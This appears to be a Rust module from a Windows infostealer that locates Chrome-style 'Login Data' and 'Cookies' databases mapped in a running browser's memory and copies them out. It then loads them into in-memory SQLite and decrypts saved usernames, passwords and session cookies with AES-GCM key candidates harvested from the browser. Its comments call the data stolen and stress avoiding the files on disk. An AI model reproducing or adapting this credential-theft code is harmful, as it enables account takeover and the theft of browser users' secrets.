use std::ffi::c_void;
use std::mem::{size_of, transmute, zeroed};
use std::sync::OnceLock;

use rusqlite::Connection;
use windows::core::{s, w, PWSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_MAPPED, PAGE_READONLY,
};
use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};

use crate::crypto;
use crate::mem;

pub struct LoginRow {
    pub browser: &'static str,
    pub origin_url: String,
    pub username: String,
    pub password: String,
    pub created: i64,
    pub last_used: i64,
    pub modified: i64,
}

pub struct CookieRow {
    pub browser: &'static str,
    pub host: String,
    pub name: String,
    pub path: String,
    pub value: String,
    pub secure: bool,
    pub httponly: bool,
    pub created: i64,
    pub expires: i64,
    pub last_access: i64,
    pub last_update: i64,
}

/// Chrome prefixes decrypted cookie plaintexts with a 32-byte SHA256 hash of
/// the cookie's domain before the actual value.
const COOKIE_PLAINTEXT_HEADER: usize = 32;

type GetMappedFileNameWFn = unsafe extern "system" fn(HANDLE, *mut c_void, PWSTR, u32) -> u32;

fn get_mapped_file_name_fn() -> Option<GetMappedFileNameWFn> {
    static FN: OnceLock<Option<GetMappedFileNameWFn>> = OnceLock::new();
    *FN.get_or_init(|| unsafe {
        let kernel32 = GetModuleHandleW(w!("kernel32.dll")).ok()?;
        let address = GetProcAddress(kernel32, s!("K32GetMappedFileNameW")).or_else(|| {
            let psapi = GetModuleHandleW(w!("psapi.dll")).ok()?;
            GetProcAddress(psapi, s!("GetMappedFileNameW"))
        })?;
        Some(transmute(address))
    })
}

/// Scan a process' address space for a memory-mapped file of the default
/// profile (e.g. "...\User Data\Default\Login Data") and return its contents.
/// The database files are held open by the browser and mapped read-only, so we
/// can copy the image straight out of memory without touching the disk files.
pub fn find_default_profile_file(h: HANDLE, file_name: &str) -> Option<Vec<u8>> {
    let get_mapped_file_name = get_mapped_file_name_fn()?;

    let mut system_info: SYSTEM_INFO = unsafe { zeroed() };
    unsafe { GetSystemInfo(&mut system_info) };

    let mut addr = system_info.lpMinimumApplicationAddress as usize;
    let end = system_info.lpMaximumApplicationAddress as usize;

    while addr < end {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { zeroed() };
        if unsafe {
            VirtualQueryEx(
                h,
                Some(addr as *const c_void),
                &mut mbi,
                size_of::<MEMORY_BASIC_INFORMATION>(),
            )
        } == 0
        {
            break;
        }

        if mbi.State == MEM_COMMIT && mbi.Protect.contains(PAGE_READONLY) && mbi.Type == MEM_MAPPED
        {
            let mut name_buf = [0u16; 1024];
            let len = unsafe {
                get_mapped_file_name(
                    h,
                    mbi.BaseAddress,
                    PWSTR(name_buf.as_mut_ptr()),
                    name_buf.len() as u32,
                )
            } as usize;
            if len > 0 && len < name_buf.len() {
                let full = String::from_utf16_lossy(&name_buf[..len]);
                let base = full.rsplit(['\\', '/']).next().unwrap_or(&full);
                if base.eq_ignore_ascii_case(file_name)
                    && full.to_lowercase().contains("\\default\\")
                {
                    crate::log_out!(
                        "[+] Found {file_name} mapped at {:#x} ({full})",
                        mbi.BaseAddress as usize
                    );
                    return mem::read_bytes(h, mbi.BaseAddress as usize, mbi.RegionSize);
                }
            }
        }

        addr = mbi.BaseAddress as usize + mbi.RegionSize;
    }

    None
}

/// Wrap a database image stolen from process memory in an in-memory SQLite
/// connection, so we can query it without ever opening the file on disk.
fn open_image(image: &[u8]) -> Option<Connection> {
    // A SQLite database image starts with a 100-byte header.
    if image.len() < 100 {
        return None;
    }
    let conn = Connection::open_in_memory().ok()?;
    let schema = b"main\0";
    let rc = unsafe {
        rusqlite::ffi::sqlite3_deserialize(
            conn.handle(),
            schema.as_ptr() as *const _,
            image.as_ptr() as *mut u8,
            image.len() as i64,
            image.len() as i64,
            rusqlite::ffi::SQLITE_DESERIALIZE_READONLY,
        )
    };
    if rc != rusqlite::ffi::SQLITE_OK {
        return None;
    }
    Some(conn)
}

fn text(row: &rusqlite::Row<'_>, index: usize) -> String {
    row.get::<_, Vec<u8>>(index)
        .map(|bytes| String::from_utf8_lossy(&bytes).to_string())
        .unwrap_or_default()
}

/// A plausible key harvested at the breakpoint, tagged with where it came from.
pub struct KeyCandidate {
    pub label: String,
    pub key: [u8; 32],
}

/// The register layout at the breakpoint shifts between browser versions, so
/// instead of trusting one register we try every harvested candidate against
/// a real encrypted blob; the AES-GCM tag only verifies for the true key.
/// The first candidate that decrypts anything wins and is reused afterwards.
fn pick_key(
    candidates: &[KeyCandidate],
    blob: &[u8],
    winner: &mut Option<usize>,
) -> Option<Vec<u8>> {
    if let Some(i) = *winner {
        if let Ok(plain) = crypto::decrypt_v20(&candidates[i].key, blob) {
            return Some(plain);
        }
    }
    for (i, candidate) in candidates.iter().enumerate() {
        if Some(i) == *winner {
            continue;
        }
        if let Ok(plain) = crypto::decrypt_v20(&candidate.key, blob) {
            *winner = Some(i);
            return Some(plain);
        }
    }
    None
}

fn report_winner(candidates: &[KeyCandidate], winner: &Option<usize>, had_winner: bool) {
    if !had_winner {
        if let Some(i) = winner {
            let candidate = &candidates[*i];
            crate::log_out!(
                "[+] Validated key candidate from {}: {}",
                candidate.label,
                crypto::to_hex(&candidate.key)
            );
        }
    }
}

fn dump_unvalidated(candidates: &[KeyCandidate]) {
    crate::log_err!("[!] No key candidate validated against any encrypted blob:");
    for candidate in candidates {
        crate::log_err!("    {}: {}", candidate.label, crypto::to_hex(&candidate.key));
    }
}

pub fn extract_logins(
    browser: &'static str,
    image: &[u8],
    candidates: &[KeyCandidate],
) -> Vec<LoginRow> {
    let mut out = Vec::new();
    let Some(conn) = open_image(image) else {
        crate::log_err!("[-] Failed to open the Login Data database image");
        return out;
    };

    let Ok(mut stmt) = conn.prepare(
        "SELECT origin_url, username_value, password_value, date_created, date_last_used, \
         date_password_modified FROM logins",
    ) else {
        crate::log_err!("[-] Failed to query the logins table");
        return out;
    };

    let Ok(mut rows) = stmt.query([]) else {
        crate::log_err!("[-] Failed to read rows from the logins table");
        return out;
    };

    let mut winner: Option<usize> = None;
    let mut saw_blob = false;
    while let Ok(Some(row)) = rows.next() {
        let blob: Vec<u8> = row.get(2).unwrap_or_default();
        if blob.is_empty() {
            continue;
        }
        saw_blob = true;
        let had_winner = winner.is_some();
        let Some(plain) = pick_key(candidates, &blob, &mut winner) else {
            crate::log_err!("[-] Failed to decrypt a saved password");
            continue;
        };
        report_winner(candidates, &winner, had_winner);
        out.push(LoginRow {
            browser,
            origin_url: text(row, 0),
            username: text(row, 1),
            password: String::from_utf8_lossy(&plain).to_string(),
            created: row.get(3).unwrap_or(0),
            last_used: row.get(4).unwrap_or(0),
            modified: row.get(5).unwrap_or(0),
        });
    }

    if saw_blob && winner.is_none() {
        dump_unvalidated(candidates);
    }

    out
}

pub fn extract_cookies(
    browser: &'static str,
    image: &[u8],
    candidates: &[KeyCandidate],
) -> Vec<CookieRow> {
    let mut out = Vec::new();
    let Some(conn) = open_image(image) else {
        crate::log_err!("[-] Failed to open the Cookies database image");
        return out;
    };

    let Ok(mut stmt) = conn.prepare(
        "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, \
         creation_utc, last_access_utc, last_update_utc FROM cookies",
    ) else {
        crate::log_err!("[-] Failed to query the cookies table");
        return out;
    };

    let Ok(mut rows) = stmt.query([]) else {
        crate::log_err!("[-] Failed to read rows from the cookies table");
        return out;
    };

    let mut winner: Option<usize> = None;
    let mut saw_blob = false;
    while let Ok(Some(row)) = rows.next() {
        let blob: Vec<u8> = row.get(6).unwrap_or_default();
        if blob.is_empty() {
            continue;
        }
        saw_blob = true;
        let had_winner = winner.is_some();
        let Some(plain) = pick_key(candidates, &blob, &mut winner) else {
            crate::log_err!("[-] Failed to decrypt a cookie");
            continue;
        };
        report_winner(candidates, &winner, had_winner);
        if plain.len() <= COOKIE_PLAINTEXT_HEADER {
            continue;
        }
        let value = String::from_utf8_lossy(&plain[COOKIE_PLAINTEXT_HEADER..]).to_string();
        out.push(CookieRow {
            browser,
            host: text(row, 0),
            name: text(row, 1),
            path: text(row, 2),
            value,
            secure: row.get::<_, i64>(3).unwrap_or(0) != 0,
            httponly: row.get::<_, i64>(4).unwrap_or(0) != 0,
            expires: row.get(5).unwrap_or(0),
            created: row.get(7).unwrap_or(0),
            last_access: row.get(8).unwrap_or(0),
            last_update: row.get(9).unwrap_or(0),
        });
    }

    if saw_blob && winner.is_none() {
        dump_unvalidated(candidates);
    }

    out
}
